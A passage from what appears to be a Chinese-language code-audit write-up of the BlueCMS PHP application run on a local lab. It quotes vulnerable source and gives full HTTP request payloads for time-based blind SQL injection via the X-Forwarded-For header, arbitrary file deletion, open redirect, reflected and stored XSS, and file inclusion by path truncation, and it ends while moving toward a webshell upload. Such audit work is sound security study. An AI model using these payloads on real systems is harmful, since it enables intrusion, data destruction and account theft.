<span class="number">1</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		$db-&gt;query(<span class="string">"UPDATE "</span>.table(<span class="string">'article'</span>).<span class="string">" SET comment = comment+1 WHERE id = "</span>.$id);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">elseif</span>($type == <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		$db-&gt;query(<span class="string">"UPDATE "</span>.table(<span class="string">'post'</span>).<span class="string">" SET comment = comment+1 WHERE post_id = "</span>.$id);</span><br><span class="line"> 	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_CFG[<span class="string">'comment_is_check'</span>] == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		showmsg(<span class="string">'请稍候，您的评论正在审核当中...'</span>,<span class="string">'comment.php?id='</span>.$id.<span class="string">'&amp;type='</span>.$type);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		showmsg(<span class="string">'发布评论成功'</span>,<span class="string">'comment.php?id='</span>.$id.<span class="string">'&amp;type='</span>.$type);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要执行SQL语句所需要控制的变量为<code>$_GET[&#39;act&#39;] == &#39;send&#39;,$_POST[&#39;content&#39;] != &#39;&#39;,</code></p>
<p>然后分析SQL语句，这是一个<strong>INSERT INTO</strong>语句，注入的方式有挺多种，这里我采用的是通过<code>select case when then else</code>语句进行延时注入的方法，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /comment.php?act=send HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=5</span><br><span class="line">X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">id=1&amp;mood=1&amp;comment=1&amp;type=1</span><br></pre></td></tr></table></figure>

<p>拼接后的sql语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blue_comment (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check) <span class="keyword">VALUES</span> (<span class="string">''</span>, <span class="string">'1'</span>, <span class="string">'3'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">98</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">1</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>),<span class="string">'1'</span>)<span class="comment">#, '1')</span></span><br></pre></td></tr></table></figure>

<p>之后就是写脚本注入了</p>
<p>同样的漏洞存在于<code>/include/common.inc.php</code>第四十五行存在通过getip()函数获得的变量<code>$online_ip</code>，跟踪该变量发现<code>/guest_book.php</code>第77-78行同样存在SQL注入漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line">	$rid = intval($_POST[<span class="string">'rid'</span>]);</span><br><span class="line"> 	$content = !<span class="keyword">empty</span>($_POST[<span class="string">'content'</span>]) ? htmlspecialchars($_POST[<span class="string">'content'</span>]) : <span class="string">''</span>;</span><br><span class="line"> 	$content = nl2br($content);</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		showmsg(<span class="string">'评论内容不能为空'</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line">	$sql = <span class="string">"INSERT INTO "</span> . table(<span class="string">'guest_book'</span>) . <span class="string">" (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">			VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')"</span>;</span><br><span class="line">	$db-&gt;query($sql);</span><br><span class="line">	showmsg(<span class="string">'恭喜您留言成功'</span>, <span class="string">'guest_book.php?page_id='</span>.$_POST[<span class="string">'page_id'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /guest_book.php?act=send HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/ann.php?cid=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5</span><br><span class="line">X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">rid=1&amp;content=1</span><br></pre></td></tr></table></figure>

<h3 id="3-任意文件跳转漏洞"><a href="#3-任意文件跳转漏洞" class="headerlink" title="3.任意文件跳转漏洞"></a>3.任意文件跳转漏洞</h3><p><code>/user.php</code>文件第112行通过控制变量<code>$from</code>可进行任意文件跳转</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$from = !empty($from) ? base64_decode($from) : &apos;user.php&apos;;</span><br><span class="line">showmsg(&apos;欢迎您 &apos;.$user_name.&apos; 回来，现在将转到...&apos;, $from);</span><br></pre></td></tr></table></figure>

<p>前面我们已经分析了<strong>showmsg</strong>函数的作用是页面跳转，同时注意这里<code>$from</code>有经过base64解密，我们通过登录用户，抓取登录包，其实就可以发现$from变量，我们假设跳转到根目录下的robots.txt文件，将<code>robots.txt</code>进行base64编码</p>
<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 108</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/user.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">referer=&amp;user_name=user02&amp;pwd=user02&amp;safecode=xipt&amp;useful_time=604800&amp;submit=%B5%C7%C2%BC&amp;from=cm9ib3RzLnR4dA==&amp;act=do_login</span><br></pre></td></tr></table></figure>

<p>登录成功后跳转到robots.txt页面</p>
<h3 id="4-任意文件删除漏洞"><a href="#4-任意文件删除漏洞" class="headerlink" title="4.任意文件删除漏洞"></a>4.任意文件删除漏洞</h3><p><code>/user.php</code>第616行存在未过滤变量<code>$_POST[&#39;lit_pic&#39;]</code>，导致任意文件删除漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>])) &#123;</span><br><span class="line">		@unlink(BLUE_ROOT.$_POST[<span class="string">'lit_pic'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=do_info_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">post_id=1&amp;title=1&amp;link_man=1&amp;link_phone=1&amp;lit_pic=demo.php</span><br></pre></td></tr></table></figure>

<p>同样<code>/admin/flash.php</code>第62-63行存在未过滤变量<code>$_POST[&#39;image_path2&#39;]</code>，导致任意文件删除漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file_exists(BLUE_ROOT.$_POST[<span class="string">'image_path2'</span>]))&#123;</span><br><span class="line">	@unlink(BLUE_ROOT.$_POST[<span class="string">'image_path2'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/flash.php?act=do_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">image_id=1&amp;image_path2=demo.php</span><br></pre></td></tr></table></figure>

<h3 id="5-反射型XSS"><a href="#5-反射型XSS" class="headerlink" title="5.反射型XSS"></a>5.反射型XSS</h3><p><code>/admin/card.php</code>第57行存在可利用的变量$name导致的反射型xss漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name		=	!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) ? trim($_POST[<span class="string">'name'</span>]) : <span class="string">''</span>;</span><br><span class="line">showmsg(<span class="string">'编辑充值卡 '</span>.$name.<span class="string">' 成功'</span>, <span class="string">'card.php'</span>);</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/card.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/admin/card.php?act=edit&amp;id=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4; BLUE[user_id]=2; BLUE[user_name]=user01; BLUE[user_pwd]=30f21397b842ad32aaeae277d571edcd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&amp;value=100&amp;price=30&amp;is_close=0&amp;id=1&amp;act=do_edit</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/bluecms/10.png" alt=""></p>
<p>弹框后跳转至card.php</p>
<h3 id="6-存储型XSS"><a href="#6-存储型XSS" class="headerlink" title="6.存储型XSS"></a>6.存储型XSS</h3><p>这个漏洞挺难发现的，我也是看别人的文章才学习到的，我们在审计时应该有注意在<code>/user.php</code>中的注册功能下有一个函数<strong>uc_user_register</strong>，跟踪该函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_user_register</span><span class="params">($username, $password, $email, $questionid = <span class="string">''</span>, $answer = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> call_user_func(UC_API_FUNC, <span class="string">'user'</span>, <span class="string">'register'</span>, <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username, <span class="string">'password'</span>=&gt;$password, <span class="string">'email'</span>=&gt;$email, <span class="string">'questionid'</span>=&gt;$questionid, <span class="string">'answer'</span>=&gt;$answer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们应该都会很奇怪这个<strong>UD_API_FUNC</strong>到底是什么鬼，查询一下其实就是一个引擎检查用户输入是否合法返回对应的<strong>uid</strong>，具体我们没必要深究下去，总之他是一个检查机制</p>
<p>而回到<code>/user.php</code>的编辑个人资料功能的代码下，我们惊奇的发现这个功能里，我们输入修改的资料信息后，直接将信息更新到了数据库中，并没有通过上面那个引擎对我们的输入进行合法性检查，所以我们就可以利用这个功能，进行存储型的XSS攻击</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 1475</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/user.php?act=my_info</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic1&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic2&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;birthday&quot;</span><br><span class="line"></span><br><span class="line">2019-03-14</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;sex&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;email&quot;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;msn&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;qq&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;office_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;home_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;mobile_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;address&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;act&quot;</span><br><span class="line"></span><br><span class="line">edit_user_info</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">È·ÈÏÐÞ¸Ä</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB--</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/bluecms/11.png" alt=""></p>
<p>编辑成功后跳转回用户信息界面，每次访问都会触发弹框，因为我们编辑用户邮箱为<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<h3 id="7-任意文件包含漏洞"><a href="#7-任意文件包含漏洞" class="headerlink" title="7.任意文件包含漏洞"></a>7.任意文件包含漏洞</h3><p>这个漏洞也是通过审计工具才知道的，在<code>/user.php</code>第750行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'pay'</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'data/pay.cache.php'</span>;</span><br><span class="line">	$price = $_POST[<span class="string">'price'</span>];</span><br><span class="line">	$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">	$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line"> 	<span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'pay'</span>])) &#123;</span><br><span class="line"> 		showmsg(<span class="string">'对不起，您没有选择支付方式'</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">include</span> <span class="string">'include/payment/'</span>.$_POST[<span class="string">'pay'</span>].<span class="string">"/index.php"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>变量<code>$_POST[&#39;pay&#39;]</code>拼接到include函数中，且只有开头包含文件的转义过滤处理，我们可以使用<code>0x00</code>或文件长度截断方式进行过滤，本次审计的环境是<strong>PHP5.2.17</strong>，如果环境为5.4以上那么上述两种方法无效，不存在任意文件包含漏洞，但是为了更好理解漏洞，我还是将环境设为5.3以下</p>
<p>包含根目录下<strong>robots.txt</strong>的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=pay HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 632</span><br><span class="line"></span><br><span class="line">pay=../../robots.txt....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>

<p>这里我使用了字符<code>.</code>来进行文件长度截断</p>
<p><img src="../../../../img/bluecms/12.png" alt=""></p>
<p>有了文件包含漏洞，我们接着就可以考虑是不是上传图片马，这样就能成功执行<strong>shell</strong>，所以接下来我们找一个可以上传文件的页面：<code>/admin/flash.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'do_add'</span>)&#123;</span><br><span class="line"> 	$image_link = !<span class="keyword">empty</span>($_POST[<span class="string">'image_link'</span>]) ? trim($_POST[<span class="string">'image_link'</span>]) : <span class="string">''</span>;</span><br><span class="line"> 	$show_order = !<span class="keyword">empty</span>($_POST[<span class="string">'show_order'</span>]) ? intval($_POST[<span class="string">'showorder'</span>]) : <span class="string">''</span>;</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'image_path'</span>][<span class="string">'error'</span>]) &amp;&amp; $_FILES[<span class="string">'image_path'</span>][<span class="string">'error'</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		$image_path = $image-&gt;img_upload($_FILES[<span class="string">'image_path'</span>],<span class="string">'flash'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($image_path == <span class="string">''</span>)&#123;</span><br><span class="line">		